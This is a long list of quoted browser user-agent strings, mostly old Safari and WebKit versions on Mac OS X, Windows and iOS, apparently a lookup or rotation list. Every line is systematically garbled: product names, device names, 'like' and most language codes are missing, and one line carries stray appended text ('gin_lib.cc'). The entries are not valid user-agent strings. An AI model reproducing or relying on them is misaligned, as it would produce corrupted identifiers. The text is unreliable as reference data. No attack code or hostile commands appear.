	"/5.0 ; U; CPU  OS 4_3_1  Mac OS X; zh-tw /533.17.9 KHTML,  Gecko /5.0.2 /8G4 Safari/6533.18.5"
	"/5.0 ; U; CPU  OS 4_3  Mac OS X; pl-pl /533.17.9 KHTML,  Gecko /5.0.2 /8F190 Safari/6533.18.5"
	"/5.0 ; U; CPU  OS 4_3  Mac OS X; fr-fr /533.17.9 KHTML,  Gecko /5.0.2 /8F190 Safari/6533.18.5"
	"/5.0 ; U; CPU  OS 4_3  Mac OS X; -gb /533.17.9 KHTML,  Gecko /5.0.2 /8F190 Safari/6533.18.5"
	"/5.0 ; U; CPU  OS 4_2_1  Mac OS X; - /533.17.9 KHTML,  Gecko /5.0.2 /8C148 Safari/6533.18.5"
	"/5.0 ; U; CPU  OS 4_2_1  Mac OS X; nb-no /533.17.9 KHTML,  Gecko /5.0.2 / Safari/6533.18.5"
	"/5.0 Windows; U; Windows NT 5.2; -US /533.17.8 KHTML,  Gecko /5.0.1 Safari/533.17.8"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_4; th-th /533.17.8 KHTML,  Gecko /5.0.1 Safari/533.17.8"
	"/5.0 X11; U; Linux x86_64; -us /531.2+ KHTML,  Gecko /5.0 Safari/531.2+"
	"/5.0 X11; U; Linux x86_64; - /531.2+ KHTML,  Gecko /5.0 Safari/531.2+"
	"/5.0 Windows; U; Windows NT 6.1; -JP /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Windows; U; Windows NT 6.1; es-ES /533.18.1 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Windows; U; Windows NT 6.1; -US /533.18.1 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Windows; U; Windows NT 6.0; -JP /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_8; - /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; fr /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; zh- /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; - /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; ko-kr /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; - /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; HTC-; - /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -us /534.1+ KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; - /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; el-gr /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -es /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; zh-tw /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; - /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; - /533.16 KHTML,  Gecko /5.0 Safari/533.16"
	"/5.0 Windows; U; Windows NT 5.0; - /533.16 KHTML,  Gecko /4.1 Safari/533.16"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; nl-nl /533.16 KHTML,  Gecko /4.1 Safari/533.16"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; - /533.16 KHTML,  Gecko /4.1 Safari/533.16"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; - /533.16 KHTML,  Gecko /4.1 Safari/533.16"
	"/5.0 Macintosh; U; Intel Mac OS X 10_7; -us /533.4 KHTML,  Gecko /4.1 Safari/533.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; nb-no /533.16 KHTML,  Gecko /4.1 Safari/533.16"
	"/5.0 Windows; U; Windows NT 5.1;  /526.9 KHTML,  Gecko /4.0dp1 Safari/526.8"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; tr /528.4+ KHTML,  Gecko /4.0dp1 Safari/526.11.2"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11;  /528.4+ KHTML,  Gecko /4.0dp1 Safari/526.11.2"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11;  /528.4+ KHTML,  Gecko /4.0dp1 Safari/526.11.2"
	"/5.0 Macintosh; U; PPC Mac OS X 10.5; -US; rv: Gecko/20081212"
	"/5.0 Windows; U; Windows NT 5.1;  /526.9 KHTML,  Gecko /4.0dp1 Safari/526.8"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -gb /528.10+ KHTML,  Gecko /4.0dp1 Safari/526.11.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_4; -us /528.4+ KHTML,  Gecko /4.0dp1 Safari/526.11.2"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_4; -gb /528.4+ KHTML,  Gecko /4.0dp1 Safari/526.11.2"
	"/5.0 Windows; U; Windows NT 6.1; es-ES /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Windows; U; Windows NT 6.0; -US /533.18.1 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Windows; U; Windows NT 6.0; -US /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Windows; U; Windows NT 6.0; -gb /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Windows; U; Windows NT 5.1; cs-CZ /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_8; -us /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; -dk /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; - /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -us /533.4+ KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -us /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; - /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; - /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; nl-nl /531.22.7 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 Macintosh; Intel Mac OS X 10_6_8 /534.57.2 KHTML,  Gecko /4.0.5 Safari/531.22.7"
	"/5.0 ; U; CPU  OS 4_1  Mac OS X; -us /532.9 KHTML,  Gecko /4.0.5 / Safari/6531.22.7"
	"/5.0 ; U; CPU  OS 4_1  Mac OS X; -us /532.9 KHTML,  Gecko /4.0.5 /8B117 Safari/6531.22.7"
	"/5.0; U; CPU  OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B314 Safari/531.21.10gin_lib.cc"
	"/5.0; U; CPU  OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B314 Safari/531.21.10"
	"/5.0; U; CPU  OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B314 Safari/123"
	"/5.0 Windows; U; Windows NT 6.1; zh-TW /531.21.8 KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 Windows; U; Windows NT 6.1; ko-KR /531.21.8 KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 Windows; U; Windows NT 6.0; -US /533.18.1 KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 Windows; U; Windows NT 5.2; -US /531.21.8 KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 Windows; U; Windows NT 5.1; -DE /532+ KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 Macintosh; U; PPC Mac OS X 10_6_1; en_GB, en_US /531.21.10 KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; - /531.21.8 KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_3; -us /531.21.11 KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; - /533.2+ KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; -us /531.21.8 KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_2; - /531.21.8 KHTML,  Gecko /4.0.4 Safari/531.21.10"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0  Simulator; U; CPU  OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7D11 Safari/531.21.10"
	"/5.0 ;U;CPU OS 3_2_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B500 Safari/531.21.10"
	"/5.0 ; U; CPU OS 3_2_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B500 Safari/53"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; es-es /531.21.10 KHTML,  Gecko /4.0.4 /7B367 Safari/531.21.10"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; es-es /531.21.10 KHTML,  Gecko /4.0.4 /7B360 Safari/531.21.10"
	"/5.0 Windows; U; Windows NT 6.0; fr-ch /531.9 KHTML,  Gecko /4.0.3 Safari/531.9"
	"/5.0 Windows; U; Windows NT 6.0; -us /531.9 KHTML,  Gecko /4.0.3 Safari/531.9"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_8; -us /532.0+ KHTML,  Gecko /4.0.3 Safari/531.9.2009"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_8; -us /532.0+ KHTML,  Gecko /4.0.3 Safari/531.9"
	"/5.0 Macintosh; U; Intel Mac OS X 10_6_1; nl-nl /532.3+ KHTML,  Gecko /4.0.3 Safari/531.9"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; fi-fi /531.9 KHTML,  Gecko /4.0.3 Safari/531.9"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_8; -us /531.21.8 KHTML,  Gecko /4.0.3 Safari/531.21.10"
	"/5.0 Macintosh; Intel Mac OS X 10_6 /531.4 KHTML,  Gecko /4.0.3 Safari/531.4"
	"/5.0 Windows; U; Windows NT 6.1; -US /532+ KHTML,  Gecko /4.0.2 Safari/530.19.1"
	"/5.0 Windows; U; Windows NT 6.1; -US /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19.1"
	"/5.0 Windows; U; Windows NT 6.0; zh-TW /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19.1"
	"/5.0 Windows; U; Windows NT 6.0; pl-PL /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19.1"
	"/5.0 Windows; U; Windows NT 6.0; -JP /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19.1"
	"/5.0 Windows; U; Windows NT 6.0; fr-FR /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19.1"
	"/5.0 Windows; U; Windows NT 6.0; -US /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19.1"
	"/5.0 Windows; U; Windows NT 5.2; -DE /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19.1"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_7; -us /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_7; -us /530.19.2 KHTML,  Gecko /4.0.2 Safari/530.19"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_7; -us /531.2+ KHTML,  Gecko /4.0.1 Safari/530.18"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_7; -us /530.19.2 KHTML,  Gecko /4.0.1 Safari/530.18"
	"/5.0 Windows; U; Windows NT 6.0; -RU /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 6.0; -JP /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 6.0; -HU /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 6.0; -IL /528+ KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 6.0; fr-FR /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 6.0; es-es /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 6.0; -US /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 6.0;  /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 6.0; -DE /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; zh-TW /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; sv-SE /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; -RU /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; -PT /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; -BR /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; nb-NO /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; -HU /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; fr-FR /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; fi-FI /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 Windows; U; Windows NT 5.1; cs-CZ /525.28.3 KHTML,  Gecko /3.2.3 Safari/525.29"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_8; - /530.19.2 KHTML,  Gecko /3.2.3 Safari/525.28.3"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_7; - /525.28.3 KHTML,  Gecko /3.2.3 Safari/525.28.3"
	"/5.0 Windows; U; Windows NT 6.1; -DE /525.28 KHTML,  Gecko /3.2.2 Safari/525.28.1"
	"/5.0 Windows; U; Windows NT 5.2; -US /525.28 KHTML,  Gecko /3.2.2 Safari/525.28.1"
	"/5.0 Windows; U; Windows NT 5.2; -DE /528+ KHTML,  Gecko /3.2.2 Safari/525.28.1"
	"/5.0 Windows; U; Windows NT 5.1; -RU /525.28 KHTML,  Gecko /3.2.2 Safari/525.28.1"
	"/5.0 Windows; U; Windows NT 5.1; nb-NO /525.28 KHTML,  Gecko /3.2.2 Safari/525.28.1"
	"/5.0 Windows; U; Windows NT 5.1; ko-KR /525.28 KHTML,  Gecko /3.2.2 Safari/525.28.1"
	"/5.0 Windows; U; Windows NT 5.1; fr-FR /525.28 KHTML,  Gecko /3.2.2 Safari/525.28.1"
	"/5.0 Windows; U; Windows NT 5.1; es-ES /525.28 KHTML,  Gecko /3.2.2 Safari/525.28.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.28 KHTML,  Gecko /3.2.2 Safari/525.28.1"
	"/5.0 Windows; U; Windows NT 6.0; sv-SE /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Windows; U; Windows NT 5.2; -DE /528+ KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Windows; U; Windows NT 5.1; -JP /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_8; - /533.19.4 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_6; nl-nl /530.0+ KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_6; fr-fr /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_6; -us /530.1+ KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; sv- /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; pl-pl /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; - /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; fr-fr /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; es-es /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; zh-tw /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; - /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; nb-no /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; ko-kr /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; - /528.8+ KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; - /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; hr-hr /530.1+ KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; fr-fr /525.27.1 KHTML,  Gecko /3.2.1 Safari/525.27.1"
	"/5.0 Windows; U; Windows NT 6.0; -HU /525.26.2 KHTML,  Gecko /3.2 Safari/525.26.13"
	"/5.0 Windows; U; Windows NT 5.1; -RU /525.26.2 KHTML,  Gecko /3.2 Safari/525.26.13"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_5; fi-fi /525.26.2 KHTML,  Gecko /3.2 Safari/525.26.12"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_5; -us /525.26.2 KHTML,  Gecko /3.2 Safari/525.26.12"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_5; sv- /525.26.2 KHTML,  Gecko /3.2 Safari/525.26.12"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_5; - /525.26.2 KHTML,  Gecko /3.2 Safari/525.26.12"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_5; -us /525.25 KHTML,  Gecko /3.2 Safari/525.25"
	"/5.0 Windows; U; Windows NT 6.0; pl-PL /525.19 KHTML,  Gecko /3.1.2 Safari/525.21"
	"/5.0 Windows; U; Windows NT 6.0; fr-FR /525.19 KHTML,  Gecko /3.1.2 Safari/525.21"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /3.1.2 Safari/525.21"
	"/5.0 Windows; U; Windows NT 5.2; -BR /525.19 KHTML,  Gecko /3.1.2 Safari/525.21"
	"/5.0 Windows; U; Windows NT 5.1; pl-PL /525.19 KHTML,  Gecko /3.1.2 Safari/525.21"
	"/5.0 Windows; U; Windows NT 5.1; -IT /525.19 KHTML,  Gecko /3.1.2 Safari/525.21"
	"/5.0 Windows; U; Windows NT 5.1; -IT /525+ KHTML,  Gecko /3.1.2 Safari/525.21"
	"/5.0 Windows; U; Windows NT 5.1; fr-FR /525.19 KHTML,  Gecko /3.1.2 Safari/525.21"
	"/5.0 Windows; U; Windows NT 5.1; -GB /525.19 KHTML,  Gecko /3.1.2 Safari/525.21"
	"/5.0 Windows; U;  /420+ KHTML,  Gecko /3.1.2 Safari/525.21"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_6; -us /525.18.1 KHTML,  Gecko /3.1.2 Safari/525.20.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_5; fr-fr /525.18 KHTML,  Gecko /3.1.2 Safari/525.20.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_4; fr-fr /525.18 KHTML,  Gecko /3.1.2 Safari/525.20.1"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; sv- /525.18 KHTML,  Gecko /3.1.2 Safari/525.22"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; fr /525.18 KHTML,  Gecko /3.1.2 Safari/525.22"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -us /530.6+ KHTML,  Gecko /3.1.2 Safari/525.20.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -us /528.7+ KHTML,  Gecko /3.1.2 Safari/525.20.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -us /528.4+ KHTML,  Gecko /3.1.2 Safari/525.20.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -us /525.27.1 KHTML,  Gecko /3.1.2 Safari/525.20.1"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -gb /525.18.1 KHTML,  Gecko /3.1.2 Safari/525.20.1"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.18 KHTML,  Gecko /3.1.1 Safari/525.17"
	"/5.0 Windows; U; Windows NT 5.1; pl-PL /525.18 KHTML,  Gecko /3.1.1 Safari/525.17"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.18 KHTML,  Gecko /3.1.1 Safari/525.17"
	"/5.0 Windows; U; Windows NT 5.1; -US /525+ KHTML,  Gecko /3.1.1 Safari/525.17"
	"/5.0 Windows; U; Windows NT 5.1; -es /525.18 KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 /5.0 ; U; CPU  OS 2_0_1  Mac OS X; fr-fr /525.18.1 KHTML,  Gecko /3.1.1 /5G77 Safari/525.20"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_3; sv- /525.18 KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_3; -us /525.18 KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_3;  /525.18 KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_2;  /525.18 KHTML,  Gecko /3.1.1 Safari/525.18"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; - /525.18 KHTML,  Gecko /3.1.1 Safari/525.18"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11;  /525.18 KHTML,  Gecko /3.1.1 Safari/525.18"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_7; - /525.18 KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -us /525.18.1 KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_3; nl-nl /527+ KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_3; nb-no /525.18 KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_3; - /525.18 KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_3; es-es /525.18 KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_3; - /525.18 KHTML,  Gecko /3.1.1 Safari/525.20"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_2; - /525.18 KHTML,  Gecko /3.1.1 Safari/525.18"
	"/5.0 Windows; U; Windows NT 5.2; -RU /525.13 KHTML,  Gecko /3.1 Safari/525.13.3"
	"/5.0 Windows; U; Windows NT 5.1; zh-TW /525.13 KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Windows; U; Windows NT 5.1; es-ES /525.13 KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Windows; U; Windows NT 5.1; -DK /525.13 KHTML,  Gecko /3.1 Safari/525.13.3"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_4; -us /525.18 KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_2; -gb /526+ KHTML,  Gecko /3.1 Safari/525.9"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_2; -gb /526+ KHTML,  Gecko /3.1 "
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11; nl-nl /525.13 KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Macintosh; U; Intel Mac OS X; zh-tw /525.13 KHTML,  Gecko /3.1 Safari/525.13.3"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -us /525.27.1 KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -us /525.13 KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_2; -br /525.13 KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_2; - /525.13 KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_2; fr-fr /525.9 KHTML,  Gecko /3.1 Safari/525.9"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_2; es-es /525.13 KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_2; -us /526.1+ KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_2; -us /525.9 KHTML,  Gecko /3.1 Safari/525.9"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_2; -us /525.7 KHTML,  Gecko /3.1 Safari/525.7"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_2; -gb /525.13 KHTML,  Gecko /3.1 Safari/525.13"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_2; - /525.8+ KHTML,  Gecko /3.1 Safari/525.6"
	"/5.0 Windows; U; Windows NT 6.0;  /525+ KHTML,  Gecko /3.0.4 Safari/523.11"
	"/5.0 Windows; U; Windows NT 5.1; -dk /523.15.1 KHTML,  Gecko /3.0.4 Safari/523.15"
	"/5.0 Macintosh; U; PPC Mac OS X; sv- /523.12.2 KHTML,  Gecko /3.0.4 Safari/523.12.2"
	"/5.0 Macintosh; U; PPC Mac OS X; fr-fr /523.10.3 KHTML,  Gecko /3.0.4 Safari/523.10"
	"/5.0 Macintosh; U; PPC Mac OS X; -us /523.10.3 KHTML,  Gecko /3.0.4 Safari/523.10"
	"/5.0 Macintosh; U; PPC Mac OS X 10_5_4; -us /525.18 KHTML,  Gecko /3.0.4 Safari/523.10"
	"/5.0 Macintosh; U; PPC Mac OS X 10_4_11;  /525.3+ KHTML,  Gecko /3.0.4 Safari/523.12.2"
	"/5.0 Macintosh; U; Intel Mac OS X; sv- /523.12.2 KHTML,  Gecko /3.0.4 Safari/523.12.2"
	"/5.0 Macintosh; U; Intel Mac OS X; sv- /523.10.6 KHTML,  Gecko /3.0.4 Safari/523.10.6"
	"/5.0 Macintosh; U; Intel Mac OS X; sv- /523.10.3 KHTML,  Gecko /3.0.4 Safari/523.10"
	"/5.0 Macintosh; U; Intel Mac OS X; ko-kr /523.15.1 KHTML,  Gecko /3.0.4 Safari/523.15"
	"/5.0 Macintosh; U; Intel Mac OS X; - /523.12.2 KHTML,  Gecko /3.0.4 Safari/523.12.2"
	"/5.0 Macintosh; U; Intel Mac OS X; - /523.10.3 KHTML,  Gecko /3.0.4 Safari/523.10"
	"/5.0 Macintosh; U; Intel Mac OS X; - /523.12.2 KHTML,  Gecko /3.0.4 Safari/523.12.2"
	"/5.0 Macintosh; U; Intel Mac OS X; - /523.10.6 KHTML,  Gecko /3.0.4 Safari/523.10.6"
	"/5.0 Macintosh; U; Intel Mac OS X; fr-fr /525.1+ KHTML,  Gecko /3.0.4 Safari/523.10"
	"/5.0 Macintosh; U; Intel Mac OS X; fr-fr /523.10.3 KHTML,  Gecko /3.0.4 Safari/523.10"
	"/5.0 Macintosh; U; Intel Mac OS X; fr /523.12.2 KHTML,  Gecko /3.0.4 Safari/523.12.2"
